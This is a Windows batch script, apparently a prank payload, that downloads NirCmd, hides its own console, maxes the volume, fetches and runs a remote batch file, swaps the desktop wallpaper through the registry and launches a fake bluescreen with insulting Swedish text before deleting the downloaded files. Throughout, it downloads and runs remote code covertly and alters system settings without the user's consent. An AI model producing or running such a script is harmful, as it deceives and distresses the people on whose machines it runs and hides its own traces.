cd C:\Users\%username%\Downloads\
curl https://www.nirsoft.net/utils/nircmd-x64.zip -O
powershell Expand-Archive -Force nircmd-x64.zip C:\Users\%username%\Downloads\


C:\Users\%username%\Downloads\nircmd.exe win hide intitle "cmd.exe"
C:\Users\%username%\Downloads\nircmd.exe setsysvolume 65535

curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/RickStart.bat -O RickStart.bat
start /MIN RickStart.bat

cd C:\Users\%username%\Downloads\
curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/maxresdefault.jpg -O maxresdefault.jpg
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\%username%\Downloads\maxresdefault.jpg /f
C:\Windows\System32\rundll32.exe C:\Windows\System32\user32.dll, UpdatePerUserSystemParameters

cd C:\Program Files (x86)\Steam\steamapps\common\wallpaper_engine\
wallpaper32.exe -control openWallpaper -file C:\Users\%username%\Downloads\maxresdefault.jpg

curl https://github.com/FlyTechVideos/BluescreenSimulator/releases/download/3.1/BluescreenSimulator.exe -O BluescreenSimulator.exe
chcp 65001
BluescreenSimulator.exe --win10 -m1 "Du är så jävla dum i huvudet" -m2 "och ingen gillar dig" -p Complete -sc "Stop code: RICK_ROLLED_BITCH" -hq  -b "#FFFF4500"


cd C:\Users\%username%\Downloads\
del C:\Users\%username%\Downloads\nircmd.exe
del C:\Users\%username%\Downloads\nircmdc.exe
del C:\Users\%username%\Downloads\NirCmd.chm
del C:\Users\%username%\Downloads\RickStart.bat
del C:\Users\%username%\Downloads\nircmd-x64.zip
del C:\Users\%username%\Downloads\maxresdefault.jpg

exit
